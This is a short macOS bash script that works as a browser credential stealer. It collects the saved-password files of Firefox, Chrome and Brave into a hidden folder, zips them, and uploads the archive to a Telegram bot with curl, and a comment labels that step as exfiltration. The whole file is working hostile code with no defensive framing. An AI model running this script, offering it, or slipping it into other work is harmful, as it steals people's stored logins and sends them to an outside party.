#!/bin/bash

cd ~/.hidden/

# firefox
zip -u firefox.zip ~/Library/Application\ Support/Firefox/Profiles/*.default-release/key4.db ~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json 

# google chrome
zip -u chrome.zip ~/Library/Application\ Support/Google/Chrome/Profile*/Login\ Data 

# brave browser
zip -u brave.zip ~/Library/Application\ Support/BraveSoftware/Brave-Browser/Default/Login\ Data 

# combine files into one
zip -u data.zip firefox.zip chrome.zip brave.zip 

# exfil data to telegram
curl -F "chat_id=<your_chat_id>" -F document=@data.zip https://api.telegram.org/bot<your_bot_id>/sendDocument